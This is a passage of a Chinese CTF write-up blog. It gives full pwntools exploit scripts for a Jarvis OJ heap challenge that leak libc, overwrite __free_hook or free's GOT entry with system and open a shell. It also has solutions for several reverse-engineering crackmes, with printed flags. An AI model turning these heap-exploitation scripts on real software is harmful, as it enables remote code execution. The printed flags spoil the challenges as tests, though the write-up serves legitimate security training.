<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    cn = process(<span class="string">'./itemboard'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cn = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9887</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line">bin = ELF(<span class="string">'./itemboard'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_item</span><span class="params">(name, length, des)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'choose:'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Item name?'</span>)</span><br><span class="line">    cn.sendline(name)</span><br><span class="line">    cn.recvuntil(<span class="string">'len?'</span>)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(<span class="string">'Description?'</span>)</span><br><span class="line">    cn.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_item</span><span class="params">()</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'choose:'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">print</span> cn.recvuntil(<span class="string">'1.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_item</span><span class="params">(num, ans=<span class="string">'Description:'</span>)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'choose:'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Which item?'</span>)</span><br><span class="line">    cn.sendline(str(num))</span><br><span class="line">    cn.recvuntil(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_item</span><span class="params">(num)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'choose:'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Which item?'</span>)</span><br><span class="line">    cn.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(cn)</span><br><span class="line">    raw_input()</span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">new_item(<span class="string">'0'</span>,<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">new_item(<span class="string">'1'</span>,<span class="number">0x80</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">delete_item(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    show_item(<span class="number">0</span>)</span><br><span class="line">    data = u64(cn.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    libc_base = data<span class="number">-0x3c4b78</span></span><br><span class="line">    free_hook_ptr =libc_base + <span class="number">0x3C3EF8</span></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    show_item(<span class="number">0</span>)</span><br><span class="line">    data = u64(cn.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    libc_base = data<span class="number">-0x3BE7B8</span></span><br><span class="line">    free_hook_ptr =libc_base + <span class="number">0x3BDEE8</span></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"free_hook_ptr: "</span> + hex(free_hook_ptr))</span><br><span class="line">success(<span class="string">"system: "</span> + hex(system))</span><br><span class="line"></span><br><span class="line">pay = p64(system) </span><br><span class="line">pay +=<span class="string">'a'</span>*(<span class="number">1024</span> + <span class="number">8</span>-len(pay))</span><br><span class="line">pay += p64(free_hook_ptr<span class="number">-8</span>)</span><br><span class="line"></span><br><span class="line">new_item(<span class="string">'/bin/sh\x00'</span>,len(pay),pay)</span><br><span class="line"></span><br><span class="line">delete_item(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<p>之前网上看到有leak堆地址，libc地址和code地址，然后got表hijack的做法，虽然感觉略显麻烦，但还是贴一下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    </span><br><span class="line">    p = process(<span class="string">'./itemboard'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9887</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_item</span><span class="params">(name, length, des)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choose:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Item name?'</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">'len?'</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'Description?'</span>)</span><br><span class="line">    p.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_item</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choose:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">print</span> p.recvuntil(<span class="string">'1.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_item</span><span class="params">(num, ans=<span class="string">'Description:'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choose:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Which item?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_item</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choose:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Which item?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. Leaking libc address and heap address!</span></span><br><span class="line">    new_item(<span class="string">'0'</span>*<span class="number">8</span>, <span class="number">256</span>, <span class="string">'0'</span>*<span class="number">16</span>)</span><br><span class="line">    new_item(<span class="string">'1'</span>*<span class="number">8</span>, <span class="number">32</span>, <span class="string">'1'</span>*<span class="number">16</span>)</span><br><span class="line">    delete_item(<span class="number">0</span>)</span><br><span class="line">    show_item(<span class="number">0</span>)  </span><br><span class="line">    addr = p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    main_arena = u64(addr[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    delete_item(<span class="number">1</span>)</span><br><span class="line">    show_item(<span class="number">1</span>)</span><br><span class="line">    addr = p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    heap_addr = u64(addr[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        libc = main_arena - <span class="number">0x3c3b10</span> - <span class="number">0x68</span></span><br><span class="line">        system_addr = libc + <span class="number">0x45390</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc = main_arena - <span class="number">0x3be740</span> - <span class="number">0x78</span></span><br><span class="line">        system_addr = libc + <span class="number">0x46590</span></span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">"libc address: "</span> + hex(libc))</span><br><span class="line">    log.success(<span class="string">"system address: "</span> + hex(system_addr))</span><br><span class="line">    log.success(<span class="string">"heap address: "</span> + hex(heap_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. Getting .text address</span></span><br><span class="line">    payload =  p64(heap_addr)</span><br><span class="line">    payload =  payload.ljust(<span class="number">1032</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(heap_addr + <span class="number">0x38</span>)</span><br><span class="line">    new_item(p64(heap_addr - <span class="number">0x10</span>), <span class="number">1048</span>, payload)</span><br><span class="line">    show_item(<span class="number">1</span>, <span class="string">'Name:'</span>)</span><br><span class="line">    addr = p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    item_free = u64(addr[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    text = item_free - <span class="number">0xb39</span></span><br><span class="line">    free_got = text + <span class="number">0x202018</span></span><br><span class="line">    log.success(<span class="string">"text address: "</span> + hex(text))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. Overwriting free_got</span></span><br><span class="line">    payload =  p64(system_addr)</span><br><span class="line">    payload =  payload.ljust(<span class="number">1032</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(heap_addr - <span class="number">0x148</span>)</span><br><span class="line">    new_item(<span class="string">"/bin/sh\x00"</span>, <span class="number">32</span>, p64(free_got))</span><br><span class="line">    new_item(<span class="string">'4'</span>*<span class="number">16</span>, <span class="number">1048</span>, payload)</span><br><span class="line">    delete_item(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
<p>flag:<code>CTF{c05164e58af089801c96d9c6a5598263}</code></p>
<hr>
<h2 id="RE-Classical-CrackMe2"><a href="#RE-Classical-CrackMe2" class="headerlink" title="RE - Classical CrackMe2"></a>RE - Classical CrackMe2</h2><p>题目描述：</p>
<blockquote>
<p>做完了Classical CrackMe1是不是不太过瘾？那再来一题吧。</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/CrackMe2.rar.6886f4141bedfb27a2dd0d3dcc4f38f9" target="_blank" rel="noopener">CrackMe2.rar.6886f4141bedfb27a2dd0d3dcc4f38f9</a></p>
</blockquote>
<p>这是一道.net的逆向。</p>
<p>似乎有一点混淆，导致变量名看起来都非常奇怪。</p>
<p>主要方法是用dnSpy动态加静态调试。</p>
<p>主要的代码：</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_3d206de3cbec18f77f0d4f17ce1211b6.png" alt=""></p>
<p>emmmm，非常混乱。大致是这样的逻辑。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def AES(s):</span><br><span class="line">    return AES_encode(key,s,ECB).encode(&apos;base64&apos;)</span><br><span class="line"></span><br><span class="line">text = input</span><br><span class="line">text2 = AES(text)</span><br><span class="line"></span><br><span class="line">if (text != &quot;&quot; &amp;&amp; text2 == flag_enc)&#123;</span><br><span class="line">    success</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    fail</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是，这个key和flag_enc我们都无法静态看到，（如果有静态看到的方法请告诉我谢谢），所以我通过动态调试的方法。</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_891aa400700ee6e47c927947da23b46b.png" alt=""></p>
<p>得到<code>key=pctf2016pctf2016pctf2016pctf2016</code></p>
<p>而flag_enc因为在if语句中，是临时变量，dnSpy貌似无法检测到，所以我只能通过临近内存（在text2附近）搜索的方法了。</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_37f78424cf5537c2070be0345aa08465.png" alt=""></p>
<p>最后就是AES解密了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line">mykey = <span class="string">'pctf2016'</span>*<span class="number">4</span></span><br><span class="line">enc=<span class="string">'x/nzolo0TTIyrEISd4AP1spCzlhSWJXeNbY81SjPgmk='</span>.decode(<span class="string">'base64'</span>)</span><br><span class="line">cryptor = AES.new(mykey,AES.MODE_ECB,<span class="string">'\x00'</span>*<span class="number">8</span>)</span><br><span class="line">plain = cryptor.decrypt(enc)</span><br><span class="line"><span class="keyword">print</span> plain</span><br><span class="line"></span><br><span class="line"><span class="comment">#PCTF&#123;Dot_Net_UnPack3r_yoo&#125;</span></span><br></pre></td></tr></table></figure>
<p>flag:<code>PCTF{Dot_Net_UnPack3r_yoo}</code></p>
<hr>
<h2 id="RE-软件密码破解-1"><a href="#RE-软件密码破解-1" class="headerlink" title="RE - 软件密码破解-1"></a>RE - 软件密码破解-1</h2><p>题目描述：</p>
<blockquote>
<p>请对压缩包中的程序进行分析并获取flag。flag形式为xxx-xxxxx_xxxx。</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/CTF_100_0.rar.b5abee530fee7cdae2f5cdc33bb849e8" target="_blank" rel="noopener">CTF_100_0.rar.b5abee530fee7cdae2f5cdc33bb849e8</a></p>
</blockquote>
<p>比较经典的crackme，说下难点，一是错误直接退出没有提示，二是用MFC写的，个人经验不足。</p>
<p>总之就是关键代码的查找。</p>
<p>IDA拖进去，函数巨多，看一下import，发现调用了<code>GetDlgItem</code>，OD对这个函数全部下断。</p>
<p>随意输入字符串，发现ESI出现了我们的输入。</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_425dff79a07cc80c2268a13fa49d8f37.png" alt=""></p>
<p>跑起来以后查找字符串发现目标</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_7387c8a2a70c18e3adb795228e7c15e9.png" alt=""></p>
<p>来到关键代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">00FC1C49  |.  FF15 18640E01 call dword ptr ds:[&lt;&amp;KERNEL32.WideCharTo&gt;; \WideCharToMultiByte</span><br><span class="line">00FC1C4F  |.  85F6          test esi,esi</span><br><span class="line">00FC1C51  |.  7E 16         jle short CTF_100_.00FC1C69</span><br><span class="line">00FC1C53  |.  B9 F8771301   mov ecx,CTF_100_.011377F8                ;  ecx = 0x011377F8 = &amp;&quot;在此输入口令：&quot;</span><br><span class="line">00FC1C58  |.  8BC3          mov eax,ebx                              ;  eax = ebx = input</span><br><span class="line">00FC1C5A  |.  2BCB          sub ecx,ebx                              ;  ecx = ecx - ebx</span><br><span class="line">00FC1C5C  |.  8D6424 00     lea esp,dword ptr ss:[esp]</span><br><span class="line">00FC1C60  |&gt;  8A1401        /mov dl,byte ptr ds:[ecx+eax]            ;  dl = [ecx+eax] = [0x011377F8-ebx+eax] = [0x011377F8] = &quot;在此输入口令：&quot;</span><br><span class="line">00FC1C63  |.  3010          |xor byte ptr ds:[eax],dl                ;  [eax] = [eax]^dl</span><br><span class="line">00FC1C65  |.  40            |inc eax</span><br><span class="line">00FC1C66  |.  4E            |dec esi</span><br><span class="line">00FC1C67  |.^ 75 F7         \jnz short CTF_100_.00FC1C60</span><br><span class="line">00FC1C69  |&gt;  813B 1B1C1746 cmp dword ptr ds:[ebx],0x46171C1B        ;  cmp flag_enc</span><br><span class="line">00FC1C6F  |.  0F85 E7000000 jnz CTF_100_.00FC1D5C</span><br><span class="line">00FC1C75  |.  817B 04 F4FD2&gt;cmp dword ptr ds:[ebx+0x4],0x3020FDF4</span><br><span class="line">00FC1C7C  |.  0F85 DA000000 jnz CTF_100_.00FC1D5C</span><br><span class="line">00FC1C82  |.  817B 08 B70C8&gt;cmp dword ptr ds:[ebx+0x8],0x7E8E0CB7</span><br><span class="line">00FC1C89  |.  0F85 CD000000 jnz CTF_100_.00FC1D5C</span><br><span class="line">00FC1C8F  |.  807B 0C 78    cmp byte ptr ds:[ebx+0xC],0x78</span><br><span class="line">00FC1C93  |.  0F85 C3000000 jnz CTF_100_.00FC1D5C</span><br><span class="line">00FC1C99  |.  807B 0D DE    cmp byte ptr ds:[ebx+0xD],0xDE</span><br><span class="line">00FC1C9D  |.  0F85 B9000000 jnz CTF_100_.00FC1D5C</span><br><span class="line">00FC1CA3  |.  8D85 5CFFFFFF lea eax,[local.41]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>就是一个简单的异或。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key=[<span class="number">0x28</span>,<span class="number">0x57</span>,<span class="number">0x64</span>,<span class="number">0x6B</span>,<span class="number">0x93</span>,<span class="number">0x8F</span>,<span class="number">0x65</span>,<span class="number">0x51</span>,<span class="number">0xE3</span>,<span class="number">0x53</span>,<span class="number">0xE4</span>,<span class="number">0x4E</span>,<span class="number">0x1A</span>,<span class="number">0xFF</span>]</span><br><span class="line">check=[<span class="number">0x1b</span>,<span class="number">0x1c</span>,<span class="number">0x17</span>,<span class="number">0x46</span>,<span class="number">0xf4</span>,<span class="number">0xfd</span>,<span class="number">0x20</span>,<span class="number">0x30</span>,<span class="number">0xb7</span>,<span class="number">0x0c</span>,<span class="number">0x8e</span>,<span class="number">0x7e</span>,<span class="number">0x78</span>,<span class="number">0xde</span>]</span><br><span class="line">out=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">    out+=chr(key[i]^check[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> out</span><br></pre></td></tr></table></figure>
<p>flag:<code>3Ks-grEaT_j0b!</code></p>
<hr>
<h2 id="RE-软件密码破解-2"><a href="#RE-软件密码破解-2" class="headerlink" title="RE - 软件密码破解-2"></a>RE - 软件密码破解-2</h2><p>题目描述：</p>
<blockquote>
<p>对压缩包中的程序进行分析并获取flag。flag形式为16位大写md5。</p>
</blockquote>
<blockquote>
<p>题目来源：CFF2016</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/CTF_100_1.rar.aa33faecac5307c4b1021a072e90e1d3" target="_blank" rel="noopener">CTF_100_1.rar.aa33faecac5307c4b1021a072e90e1d3</a></p>
</blockquote>
<p>相比上一题，这道题的关键函数就非常好找了。</p>
<p>ida拖进去发现main函数无法create函数，因为下面有一些乱码，这个等下再说。动态调试先跟着正常逻辑走。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00D1103B   .  8D8D FCFAFFFF lea ecx,dword ptr ss:[ebp-0x504]</span><br><span class="line">00D11041   .  51            push ecx</span><br><span class="line">00D11042   .  68 18DAD100   push CTF_100_.00D1DA18                             ; /format = &quot;%s&quot;</span><br><span class="line">00D11047   .  E8 40060000   call &lt;CTF_100_._wscanf&gt;                            ; \_wscanf</span><br><span class="line">00D1104C   .  8D85 FCFAFFFF lea eax,dword ptr ss:[ebp-0x504]                   ;  eax = input</span><br><span class="line">00D11052   .  83C4 14       add esp,0x14</span><br><span class="line">00D11055   .  8D50 02       lea edx,dword ptr ds:[eax+0x2]                     ;  edx=eax+2</span><br><span class="line">00D11058   .  EB 06         jmp short CTF_100_.00D11060</span><br><span class="line">00D1105A      8D9B 00000000 lea ebx,dword ptr ds:[ebx]</span><br><span class="line">00D11060   &gt;  66:8B08       mov cx,word ptr ds:[eax]</span><br><span class="line">00D11063   .  83C0 02       add eax,0x2</span><br><span class="line">00D11066   .  66:85C9       test cx,cx</span><br><span class="line">00D11069   .^ 75 F5         jnz short CTF_100_.00D11060</span><br><span class="line">00D1106B   .  2BC2          sub eax,edx                                        ;  eax=len(s)*2</span><br><span class="line">00D1106D   .  D1F8          sar eax,1                                          ;  eax = len(s)</span><br><span class="line">00D1106F   .  83F8 10       cmp eax,0x10                                       ;  len = 16</span><br></pre></td></tr></table></figure>
<p>得知len=16。</p>
<p>跟进sub_401180。</p>
<p>前面的一段不管，看后面</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(v13, _s, v12);</span><br><span class="line">CreateProcessW(<span class="number">0</span>, &amp;CommandLine, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line">ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, DBG_CONTINUE);</span><br><span class="line">WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line"><span class="keyword">while</span> ( DebugEvent.dwDebugEventCode != OUTPUT_DEBUG_STRING_EVENT )</span><br><span class="line">&#123;</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, DBG_CONTINUE);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line">LOWORD(ck1) = <span class="number">0</span>;</span><br><span class="line">ReadProcessMemory(</span><br><span class="line">  ProcessInformation.hProcess,</span><br><span class="line">  DebugEvent.u.CreateThread.hThread,</span><br><span class="line">  &amp;ck1,</span><br><span class="line">  DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">  &amp;NumberOfBytesRead);</span><br><span class="line">ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, DBG_CONTINUE);</span><br><span class="line">WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">Context.ContextFlags = DBG_EXCEPTION_HANDLED;</span><br><span class="line">ReadProcessMemory(</span><br><span class="line">  ProcessInformation.hProcess,</span><br><span class="line">  DebugEvent.u.CreateThread.hThread,</span><br><span class="line">  &amp;ck1,</span><br><span class="line">  DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">  &amp;NumberOfBytesRead);</span><br><span class="line">GetThreadContext(ProcessInformation.hThread, 